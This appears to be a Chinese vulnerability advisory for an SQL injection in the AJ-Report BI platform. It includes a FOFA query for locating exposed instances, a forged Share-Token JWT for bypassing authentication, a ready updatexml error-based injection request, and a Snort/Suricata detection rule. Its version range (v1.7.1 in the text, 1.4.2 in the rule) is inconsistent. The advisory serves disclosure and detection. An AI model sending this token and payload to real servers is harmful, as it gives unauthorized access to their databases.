# AJ-ReportBI平台存在SQL注入漏洞

AJ-ReportBI平台存在SQL注入漏洞，攻击者可进行sql注入攻击获取数据库信息或者权限。

# 影响版本

AJ-Report<=v1.7.1

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="AJ-Report"

POC/EXP：利用脚本获取token 再进行利用

```
GET /dataSource/queryAllDataSource HTTP/1.1
Host: 127.0.0.1:9095
Share-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyZXBvcnRDb2RlIjoiIiwic2hhcmVDb2RlIjoieCJ9.-gbPZslLSlbE1GYp_k-DFjEkwwaiRVgcoxXPX3uqAsQ
```

```
POST /dataSet/testTransform HTTP/1.1
Host: 127.0.0.1:9095
Content-Type: application/json
Share-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyZXBvcnRDb2RlIjoiIiwic2hhcmVDb2RlIjoieCJ9.-gbPZslLSlbE1GYp_k-DFjEkwwaiRVgcoxXPX3uqAsQ

{
  "setType": "sql",
  "sourceCode": "zhongli",
  "dynSentence": "select '${name}' as result",
  "dataSetParamDtoList": [
    {
      "paramName": "name",
      "sampleItem": "' AND updatexml(1,concat(0x7e,(SELECT current_user())),1)-- "
    }
  ],
  "dataSetTransformDtoList": []
}
```

![image-20260913111248229](assets/image-20260913111248229.png)

sonrt规则：

```
alert http any any -> $HOME_NET any (
    msg:"AJ-Report BI - /dataSet/testTransform SQL注入 (Share-Token越权 + updatexml报错注入)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"/dataSet/testTransform";
        fast_pattern;
    http.header_names;
        content:"share-token";
    http.content_type; content:"application/json";
    http.request_body;
        content:"dataSetParamDtoList"; nocase;
        content:"sampleItem"; nocase; distance:0;
        content:"updatexml("; distance:0; nocase;
        content:"concat("; distance:0; nocase;
        content:"0x7e"; distance:0; nocase;
        content:"SELECT"; distance:0; nocase;
    metadata:
        service http,
        affected_product "anji-plus AJ-Report <=1.4.2",
        vulnerability_type "SQL Injection (Error-based) / Share-Token Auth Bypass",
        severity "critical";
    classtype:web-application-attack;
    sid:1000734;
    rev:1;
    priority:1;
)
```

# 漏洞修复

关闭互联网暴露面或接口设置访问权限，升级至安全版本。
